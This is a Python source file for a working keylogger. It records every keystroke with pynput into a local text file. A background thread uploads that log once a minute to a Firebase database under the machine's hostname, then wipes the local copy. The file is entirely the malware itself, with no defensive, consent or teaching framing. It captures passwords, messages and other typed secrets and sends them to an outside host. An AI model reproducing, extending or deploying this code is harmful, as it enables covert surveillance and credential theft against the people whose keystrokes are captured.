from pynput.keyboard import Key, Listener
import os
from datetime import datetime
import requests
import socket
import threading
import time

firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
log_file = "keylog.txt"
hostname = socket.gethostname()

# Function to check internet availability
def is_internet_available():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False

# Function to upload the log file to Firebase
def upload_log():
    with open(log_file, 'r') as file:
        content = file.read().strip()
    
    # Check if the log file has only the new log marker
    new_log_marker = f"** New logging started at"
    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
        print("Log file contains only the new log start marker. Skipping upload.")
        return False

    if not is_internet_available():
        print("Internet not available, skipping upload.")
        return False
    
    db_path = f'users/{hostname}/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
    with open(log_file, 'r') as file:
        file_data = file.read()
    data_to_upload = {'runnner': file_data}
    
    try:
        response = requests.put(firebase_url + db_path, json=data_to_upload)
        if response.status_code == 200:
            print(f"Uploaded: {log_file}")
            # Clear the log file after successful upload
            with open(log_file, 'w') as file:
                file.truncate(0)
            # Add a new marker for the next logging session
            add_new_log_marker()
            return True
        else:
            print(f"Failed to upload (Status code {response.status_code}): {log_file}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Failed to upload {log_file}: {e}")
        return False

# Function to add a new logging session marker
def add_new_log_marker():
    with open(log_file, 'a') as file:
        file.write(f"\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\n")

# Function to periodically attempt uploading the log file every 1 minute
def periodic_upload():
    while True:
        if upload_log():
            print("Log file uploaded successfully and cleared.")
        else:
            print("Upload failed or not needed. Retrying in 1 minute.")
        time.sleep(60)  # Wait for 1 minute before the next attempt

# Debounce settings for keystrokes
recent_keys = {}
debounce_time = 0.2

# Function to write keystrokes to the current log file with debounce
def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = "\t"
    elif key == Key.enter:
        key_str = "\n"
    elif key == Key.backspace:
        key_str = "[BS]"
    
    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time

# Function to start the listener for keystrokes
def start_listener():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

# Ensure the log file exists, create it if it doesn't
def ensure_log_exists():
    if not os.path.exists(log_file):  # Create the log file if it doesn't exist
        with open(log_file, 'w') as file:
            pass  # Create an empty log file

# Main process
if __name__ == "__main__":
    ensure_log_exists()  # Ensure that the log file exists

    # Add a marker for the new logging session
    add_new_log_marker()

    # Start listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    # Start periodic upload in a separate thread
    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()

    # Keep the main thread running
    listener_thread.join()
    upload_thread.join()
